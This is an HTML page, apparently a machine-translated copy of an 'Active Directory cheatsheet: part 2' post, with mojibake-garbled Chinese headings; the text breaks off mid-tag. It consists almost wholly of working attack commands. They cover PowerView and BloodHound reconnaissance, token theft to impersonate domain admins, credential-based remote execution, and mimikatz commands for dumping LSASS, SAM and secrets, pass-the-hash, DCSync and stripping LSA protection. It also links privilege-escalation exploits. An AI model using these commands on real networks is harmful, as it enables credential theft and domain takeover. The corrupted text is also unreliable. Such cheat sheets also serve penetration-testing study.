<html>
<head>
<title>Active Directory cheatsheet: part 2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">æ´»åŠ¨ç›®å½•å¤‡å¿˜å•:ç¬¬2éƒ¨åˆ†</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/active-directory-cheatsheet-part-2-b18e9aa2e73a?source=collection_archive---------2-----------------------#2021-09-16">https://infosecwriteups.com/active-directory-cheatsheet-part-2-b18e9aa2e73a?source=collection_archive---------2-----------------------#2021-09-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="5641" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">ä¸å¹¿å‘Šç›¸å…³çš„æ‰€æœ‰å†…å®¹çš„å¤§åˆ—è¡¨</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/15d138a9abe502626c74348925f1d4a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*U2-WOg2-D8VEjgcL"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">unsplash.com</figcaption></figure><h1 id="b31f" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">åŸŸæšä¸¾</h1><h1 id="56c6" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ä½¿ç”¨PowerView</h1><p id="fd52" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><a class="ae mj" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" rel="noopener ugc nofollow" target="_blank">power view v . 3.0</a><br/><a class="ae mj" href="https://powersploit.readthedocs.io/en/latest/" rel="noopener ugc nofollow" target="_blank">power view Wiki</a></p><ul class=""><li id="1e4d" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">è·å–å½“å‰åŸŸ:<code class="fe mv mw mx my b">Get-Domain</code></li><li id="5b8c" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">æšä¸¾å…¶ä»–åŸŸ:<code class="fe mv mw mx my b">Get-Domain -Domain &lt;DomainName&gt;</code></li><li id="2300" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">è·å–åŸŸSID: <code class="fe mv mw mx my b">Get-DomainSID</code></li><li id="d747" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">è·å–åŸŸç­–ç•¥:</li></ul><p id="8dd5" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-DomainPolicy #Will show us the policy configurations of the Domain about system access or kerberos Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy</code></p><p id="880d" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">è·å–åŸŸæ§åˆ¶å™¨:</p><ul class=""><li id="b979" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">Get-DomainController Get-DomainController -Domain &lt;DomainName&gt;</code></li><li id="1f7b" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">æšä¸¾åŸŸç”¨æˆ·:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="a1ca" class="nl kw iq my b gy nm nn l no np">#Save all Domain Users to a file Get-DomainUser | Out-File -FilePath .\DomainUsers.txt  #Will return specific properties of a specific user Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List  #Enumerate user logged on a machine Get-NetLoggedon -ComputerName &lt;ComputerName&gt;  #Enumerate Session Information for a machine Get-NetSession -ComputerName &lt;ComputerName&gt;  #Enumerate domain machines of the current/specified domain where specific users are logged into Find-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName</span><span id="8380" class="nl kw iq my b gy nq nn l no np"><br/>Enum Domain Computers:</span><span id="3808" class="nl kw iq my b gy nq nn l no np">Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName  #Enumerate Live machines  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName</span></pre><p id="cffc" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æšä¸¾ç»„å’Œç»„æˆå‘˜:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1782" class="nl kw iq my b gy nm nn l no np">#Save all Domain Groups to a file: Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt  #Return members of Specific Group (eg. Domain Admins &amp; Enterprise Admins) Get-DomainGroup -Identity '&lt;GroupName&gt;' | Select-Object -ExpandProperty Member  Get-DomainGroupMember -Identity '&lt;GroupName&gt;' | Select-Object MemberDistinguishedName  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine Get-NetLocalGroup | Select-Object GroupName  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName</span></pre><p id="408e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æšä¸¾å…±äº«:</p><p id="cddd" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">#Enumerate Domain Shares Find-DomainShare #Enumerate Domain Shares the current user has access Find-DomainShare -CheckShareAccess #Enumerate "Interesting" Files on accessible shares Find-InterestingDomainShareFile -Include *passwords*</code></p><p id="d085" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æšä¸¾ç»„ç­–ç•¥:</p><ul class=""><li id="d100" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName #Enumerate all GPOs to a specific computer Get-DomainGPO -ComputerIdentity &lt;ComputerName&gt; -Properties DisplayName | Sort-Object -Property DisplayName #Get users that are part of a Machine's local Admin group Get-DomainGPOComputerLocalGroupMapping -ComputerName &lt;ComputerName&gt;</code></li><li id="ada3" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">æšä¸¾ou:</li></ul><p id="786e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-DomainOU -Properties Name | Sort-Object -Property Name</code></p><ul class=""><li id="0a2d" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">æšä¸¾ACL:</li></ul><p id="ec04" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b"># Returns the ACLs associated with the specified account Get-DomaiObjectAcl -Identity &lt;AccountName&gt; -ResolveGUIDs #Search for interesting ACEs Find-InterestingDomainAcl -ResolveGUIDs #Check the ACLs associated with a specified path (e.g smb share) Get-PathAcl -Path "\\Path\Of\A\Share"</code></p><ul class=""><li id="b5b4" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">æšä¸¾åŸŸä¿¡ä»»:</li></ul><p id="a3fe" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-DomainTrust Get-DomainTrust -Domain &lt;DomainName&gt; #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds Get-DomainTrustMapping</code></p><ul class=""><li id="72a9" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">æšä¸¾æ—ä¿¡ä»»:</li></ul><p id="bd97" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-ForestDomain Get-ForestDomain -Forest &lt;ForestName&gt; #Map the Trust of the Forest Get-ForestTrust Get-ForestTrust -Forest &lt;ForestName&gt;</code></p><p id="7fba" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ç”¨æˆ·æœå¯»:</p><ul class=""><li id="8d84" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">#Finds all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose #Find local admins on all machines of the domain Find-DomainLocalGroupMember -Verbose #Find computers were a Domain Admin OR a spesified user has a session Find-DomainUserLocation | Select-Object UserName, SessionFromName #Confirming admin access Test-AdminAccess</code></li></ul><p id="bc40" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">â—ç‰¹æƒEscåŸŸç®¡ç†å‘˜ä¸ç”¨æˆ·ç‹©çŒ:<br/>æˆ‘æœ‰ä¸€å°æœºå™¨ä¸Šçš„æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™- &gt;ä¸€ä¸ªåŸŸç®¡ç†å‘˜åœ¨é‚£å°æœºå™¨ä¸Šæœ‰ä¸€ä¸ªä¼šè¯- &gt;æˆ‘çªƒå–ä»–çš„ä»¤ç‰Œï¼Œå¹¶å†’å……ä»–- &gt;åˆ©æ¶¦ï¼</p><h1 id="3f0f" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ä½¿ç”¨ADæ¨¡å—</h1><ul class=""><li id="8638" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated">è·å–å½“å‰åŸŸ:<code class="fe mv mw mx my b">Get-ADDomain</code></li><li id="2201" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">æšä¸¾å…¶ä»–åŸŸ:<code class="fe mv mw mx my b">Get-ADDomain -Identity &lt;Domain&gt;</code></li><li id="1fce" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">è·å–åŸŸSID: <code class="fe mv mw mx my b">Get-DomainSID</code></li><li id="476e" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">è·å–åŸŸæ§åˆ¶å™¨:</li></ul><p id="f250" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-ADDomainController Get-ADDomainController -Identity &lt;DomainName&gt;</code></p><p id="84a7" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æšä¸¾åŸŸç”¨æˆ·:</p><p id="d0be" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-ADUser -Filter * -Identity &lt;user&gt; -Properties * #Get a spesific "string" on a user's attribute Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description</code></p><p id="ba20" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æšä¸¾åŸŸè®¡ç®—æœº:</p><ul class=""><li id="9fc3" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">Get-ADComputer -Filter * -Properties * Get-ADGroup -Filter *</code></li></ul><p id="3f47" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æšä¸¾åŸŸä¿¡ä»»:</p><ul class=""><li id="25c9" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">Get-ADTrust -Filter * Get-ADTrust -Identity &lt;DomainName&gt;</code></li></ul><p id="ec4e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æšä¸¾æ—ä¿¡ä»»:</p><ul class=""><li id="46c4" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">Get-ADForest Get-ADForest -Identity &lt;ForestName&gt; #Domains of Forest Enumeration (Get-ADForest).Domains</code></li><li id="01cd" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">æšä¸¾æœ¬åœ°AppLockeræœ‰æ•ˆç­–ç•¥:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="5375" class="nl kw iq my b gy nm nn l no np">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</span></pre><h1 id="ba1c" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ä½¿ç”¨è­¦çŠ¬</h1><h2 id="0351" class="nl kw iq bd kx nu nv dn lb nw nx dp lf lw ny nz lh ma oa ob lj me oc od ll oe bi translated">è¿œç¨‹ä¾¦æ¢çŠ¬</h2><p id="5834" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><a class="ae mj" href="https://github.com/fox-it/BloodHound.py" rel="noopener ugc nofollow" target="_blank"> Python BloodHoundåº“</a>æˆ–è€…ç”¨<code class="fe mv mw mx my b">pip3 install bloodhound</code>å®‰è£…</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="85a5" class="nl kw iq my b gy nm nn l no np">bloodhound-python -u &lt;UserName&gt; -p &lt;Password&gt; -ns &lt;Domain Controller's Ip&gt; -d &lt;Domain&gt; -c All</span></pre><h2 id="b820" class="nl kw iq bd kx nu nv dn lb nw nx dp lf lw ny nz lh ma oa ob lj me oc od ll oe bi translated">ç°åœºè­¦çŠ¬</h2><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="4be3" class="nl kw iq my b gy nm nn l no np">#Using exe ingestor<br/>.\SharpHound.exe --CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --domain &lt;Domain&gt; --domaincontroller &lt;Domain Controller's Ip&gt; --OutputDirectory &lt;PathToFile&gt;<br/>    <br/>#Using powershell module ingestor<br/>. .\SharpHound.ps1<br/>Invoke-BloodHound -CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --OutputDirectory &lt;PathToFile&gt;</span></pre><h1 id="f1c0" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æœ‰ç”¨çš„æšä¸¾å·¥å…·</h1><ul class=""><li id="51ee" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/dirkjanm/ldapdomaindump" rel="noopener ugc nofollow" target="_blank"> ldapdomaindump </a>é€šè¿‡LDAPè¿›è¡Œä¿¡æ¯è½¬å‚¨</li><li id="680d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/dirkjanm/adidnsdump" rel="noopener ugc nofollow" target="_blank"> adidnsdump </a>ä»»ä½•è®¤è¯ç”¨æˆ·çš„é›†æˆDNSè½¬å‚¨</li><li id="06d2" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/cyberark/ACLight" rel="noopener ugc nofollow" target="_blank">æƒé™</a>ç‰¹æƒå¸æˆ·çš„é«˜çº§å‘ç°</li><li id="8555" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/sense-of-security/ADRecon" rel="noopener ugc nofollow" target="_blank"> ADRecon </a>è¯¦ç»†çš„æ´»åŠ¨ç›®å½•é‡å»ºå·¥å…·</li></ul><h1 id="9eb4" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æœ¬åœ°æƒé™æå‡</h1><ul class=""><li id="546e" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/ohpe/juicy-potato" rel="noopener ugc nofollow" target="_blank">å¤šæ±çš„åœŸè±†</a>æ»¥ç”¨SeImpersonateæˆ–SeAssignPrimaryTokenç‰¹æƒè¿›è¡Œç³»ç»Ÿæ¨¡æ‹Ÿ</li><li id="2de8" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">âš ï¸åªèƒ½è¿è¡Œåˆ°Windows Server 2016ï¼ŒWindows 10åªèƒ½è¿è¡Œåˆ°1803è¡¥ä¸</li><li id="9523" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/TsukiCTF/Lovely-Potato" rel="noopener ugc nofollow" target="_blank">å¯çˆ±çš„åœŸè±†</a>è‡ªåŠ¨åŒ–å¤šæ±åœŸè±†</li><li id="be19" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">âš ï¸åªèƒ½è¿è¡Œåˆ°Windows Server 2016ï¼ŒWindows 10åªèƒ½è¿è¡Œåˆ°1803è¡¥ä¸</li><li id="213c" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/itm4n/PrintSpoofer" rel="noopener ugc nofollow" target="_blank"> PrintSpoofer </a>åˆ©ç”¨PrinterBugè¿›è¡Œç³»ç»Ÿæ¨¡æ‹Ÿ</li><li id="c02d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">ğŸ™é€‚ç”¨äºWindows Server 2019å’ŒWindows 10</li><li id="6b6e" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/antonioCoco/RoguePotato" rel="noopener ugc nofollow" target="_blank"> RoguePotato </a>å‡çº§ç‰ˆå¤šæ±é©¬é“ƒè–¯</li><li id="e167" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">ğŸ™é€‚ç”¨äºWindows Server 2019å’ŒWindows 10</li><li id="3a90" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">æ»¥ç”¨ä»£å¸ç‰¹æƒ</a></li><li id="e66d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/" rel="noopener ugc nofollow" target="_blank">SMBGhost CVE-2020â€“0796</a><br/><a class="ae mj" href="https://github.com/danigargu/CVE-2020-0796" rel="noopener ugc nofollow" target="_blank">æ¦‚å¿µéªŒè¯</a></li><li id="ed43" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/cube0x0/CVE-2021-36934" rel="noopener ugc nofollow" target="_blank">CVE-2021â€“36934</a></li></ul><h1 id="607d" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æœ‰ç”¨çš„æœ¬åœ°ç§æœ‰Escå·¥å…·</h1><ul class=""><li id="fa9b" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" rel="noopener ugc nofollow" target="_blank">åŠ ç”µ</a>é”™è¯¯é…ç½®æ»¥ç”¨</li><li id="bbf7" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/AlessandroZ/BeRoot" rel="noopener ugc nofollow" target="_blank"> BeRoot </a>é€šç”¨æƒé™Escæšä¸¾å·¥å…·</li><li id="3a31" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/enjoiz/Privesc" rel="noopener ugc nofollow" target="_blank">æƒé™æè¿°</a>é€šç”¨æƒé™æè¿°æšä¸¾å·¥å…·</li><li id="39fc" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/itm4n/FullPowers" rel="noopener ugc nofollow" target="_blank">å…¨æƒè¯ä¹¦</a>æ¢å¤æœåŠ¡è´¦æˆ·çš„æƒé™</li></ul><h1 id="5517" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ¨ªå‘è¿åŠ¨</h1><h1 id="9ee8" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">Powershellè¿œç¨‹å¤„ç†</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="8709" class="nl kw iq my b gy nm nn l no np">#Enable Powershell Remoting on current Machine (Needs Admin Access)<br/>Enable-PSRemoting</span><span id="ac1f" class="nl kw iq my b gy nq nn l no np">#Entering or Starting a new PSSession (Needs Admin Access)<br/>$sess = New-PSSession -ComputerName &lt;Name&gt;<br/>Enter-PSSession -ComputerName &lt;Name&gt; OR -Sessions &lt;SessionName&gt;</span></pre><h1 id="7cbe" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ä½¿ç”¨PSå‡­æ®è¿œç¨‹æ‰§è¡Œä»£ç </h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="05f0" class="nl kw iq my b gy nm nn l no np">$SecPassword = ConvertTo-SecureString '&lt;Wtver&gt;' -AsPlainText -Force<br/>$Cred = New-Object System.Management.Automation.PSCredential('htb.local\&lt;WtverUser&gt;', $SecPassword)<br/>Invoke-Command -ComputerName &lt;WtverMachine&gt; -Credential $Cred -ScriptBlock {whoami}</span></pre><h1 id="5a14" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">å¯¼å…¥powershellæ¨¡å—å¹¶è¿œç¨‹æ‰§è¡Œå…¶åŠŸèƒ½</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="cfc7" class="nl kw iq my b gy nm nn l no np">#Execute the command and start a session<br/>Invoke-Command -Credential $cred -ComputerName &lt;NameOfComputer&gt; -FilePath c:\FilePath\file.ps1 -Session $sess </span><span id="3ba6" class="nl kw iq my b gy nq nn l no np">#Interact with the session<br/>Enter-PSSession -Session $sess</span></pre><h1 id="70dc" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ‰§è¡Œè¿œç¨‹çŠ¶æ€å‘½ä»¤</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1556" class="nl kw iq my b gy nm nn l no np">#Create a new session<br/>$sess = New-PSSession -ComputerName &lt;NameOfComputer&gt;</span><span id="d727" class="nl kw iq my b gy nq nn l no np">#Execute command on the session<br/>Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}</span><span id="11cf" class="nl kw iq my b gy nq nn l no np">#Check the result of the command to confirm we have an interactive session<br/>Invoke-Command -Session $sess -ScriptBlock {$ps}</span></pre><h1 id="8e55" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ç±³ç±³å¡èŒ¨</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="a66d" class="nl kw iq my b gy nm nn l no np">#The commands are in cobalt strike format!</span><span id="6d70" class="nl kw iq my b gy nq nn l no np">#Dump LSASS:<br/>mimikatz privilege::debug<br/>mimikatz token::elevate<br/>mimikatz sekurlsa::logonpasswords</span><span id="54a2" class="nl kw iq my b gy nq nn l no np">#(Over) Pass The Hash<br/>mimikatz privilege::debug<br/>mimikatz sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;&gt; /domain:&lt;DomainFQDN&gt;</span><span id="344b" class="nl kw iq my b gy nq nn l no np">#List all available kerberos tickets in memory<br/>mimikatz sekurlsa::tickets</span><span id="ea46" class="nl kw iq my b gy nq nn l no np">#Dump local Terminal Services credentials<br/>mimikatz sekurlsa::tspkg</span><span id="0be9" class="nl kw iq my b gy nq nn l no np">#Dump and save LSASS in a file<br/>mimikatz sekurlsa::minidump c:\temp\lsass.dmp</span><span id="07aa" class="nl kw iq my b gy nq nn l no np">#List cached MasterKeys<br/>mimikatz sekurlsa::dpapi</span><span id="5d4f" class="nl kw iq my b gy nq nn l no np">#List local Kerberos AES Keys<br/>mimikatz sekurlsa::ekeys</span><span id="8c15" class="nl kw iq my b gy nq nn l no np">#Dump SAM Database<br/>mimikatz lsadump::sam</span><span id="c00f" class="nl kw iq my b gy nq nn l no np">#Dump SECRETS Database<br/>mimikatz lsadump::secrets</span><span id="b874" class="nl kw iq my b gy nq nn l no np">#Inject and dump the Domain Controler's Credentials<br/>mimikatz privilege::debug<br/>mimikatz token::elevate<br/>mimikatz lsadump::lsa /inject</span><span id="5812" class="nl kw iq my b gy nq nn l no np">#Dump the Domain's Credentials without touching DC's LSASS and also remotely<br/>mimikatz lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all</span><span id="2c6f" class="nl kw iq my b gy nq nn l no np">#List and Dump local kerberos credentials<br/>mimikatz kerberos::list /dump</span><span id="4e9c" class="nl kw iq my b gy nq nn l no np">#Pass The Ticket<br/>mimikatz kerberos::ptt &lt;PathToKirbiFile&gt;</span><span id="203f" class="nl kw iq my b gy nq nn l no np">#List TS/RDP sessions<br/>mimikatz ts::sessions</span><span id="102c" class="nl kw iq my b gy nq nn l no np">#List Vault credentials<br/>mimikatz vault::list</span></pre><p id="c9d7" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">â—å¦‚æœmimikatzå› ä¸ºLSAä¿æŠ¤æ§åˆ¶è€Œæ— æ³•è½¬å‚¨å‡­è¯ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ\</p><ul class=""><li id="314e" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">LSAä½œä¸ºå—ä¿æŠ¤çš„è¿›ç¨‹(å†…æ ¸åœŸåœ°æ—è·¯)</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="d834" class="nl kw iq my b gy nm nn l no np">#Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1<br/>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa</span><span id="fbed" class="nl kw iq my b gy nq nn l no np">#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe<br/>#Now lets import the mimidriver.sys to the system<br/>mimikatz # !+</span><span id="dd3d" class="nl kw iq my b gy nq nn l no np">#Now lets remove the protection flags from lsass.exe process<br/>mimikatz # !processprotect /process:lsass.exe /remove</span><span id="be1f" class="nl kw iq my b gy nq nn l no np">#Finally run the logonpasswords function to dump lsass<br/>mimikatz # sekurlsa::logonpasswords</span></pre><ul class=""><li id="5b73" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">LSAä½œä¸ºå—ä¿æŠ¤çš„è¿›ç¨‹(ç”¨æˆ·åœŸåœ°â€œæ— æ–‡ä»¶â€ç»•è¿‡)</li><li id="18aa" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/itm4n/PPLdump" rel="noopener ugc nofollow" target="_blank"> PPLdump </a></li><li id="a28a" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland" rel="noopener ugc nofollow" target="_blank">ç»•è¿‡ç”¨æˆ·åŒºçš„LSAä¿æŠ¤</a></li><li id="f884" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">LSAç”±å‡­æ®ä¿æŠ¤ä½œä¸ºè™šæ‹ŸåŒ–è¿›ç¨‹(LSAISO)è¿è¡Œ</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span 